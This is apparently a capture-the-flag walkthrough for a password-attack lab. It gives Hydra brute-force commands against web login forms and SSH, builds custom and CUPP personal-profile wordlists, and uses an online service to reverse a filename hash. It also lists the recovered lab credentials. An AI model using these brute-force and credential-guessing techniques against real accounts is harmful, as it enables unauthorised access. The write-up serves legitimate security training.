echo "10.48.140.145 firewall.thm jobs.thm social.thm" | sudo tee -a /etc/hosts

## Level 1:

hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt firewall.thm -s 5001 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

host: firewall.thm   login: admin   password: 12345


## Level 2:

❯ cat > words.txt << EOF
innovation
excellence
security
digital
cloud
future
talent
mht
mhtlabs
innovation123
security123
cloud123
digital123
EOF

hydra -l marco -P words.txt jobs.thm -s 5002 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

host: jobs.thm   login: marco   password: excellence


## Level 3:

python3 cupp.py -i

First Name: Marco
Surname: Bianchi
Nickname: marky
Birthdate: 14021995

hydra -l marco -P marco.txt social.thm -s 5003 \
http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

social.thm   login: marco   password: Bianchi2495


## Level 4:


Level 4

On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco’s uploaded profile picture. Submit only the filename to proceed.

Right click the img -> open in new tab -> copy the hash (`d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b`) -> Go to `hashes.com` -> Decrypt (family)


## Level 5:

Create ssh_pass_maker.sh
```bash
for k in Security Excellence Innovation Digital Cloud
    for y in (seq 2020 2026)
        echo "$k$y!"
    end
end > ssh.txt
```

then bruteforce ssh password:
hydra -l marco -P ssh.txt ssh://10.48.140.145

host: 10.48.140.145   login: marco   password: Security2024!
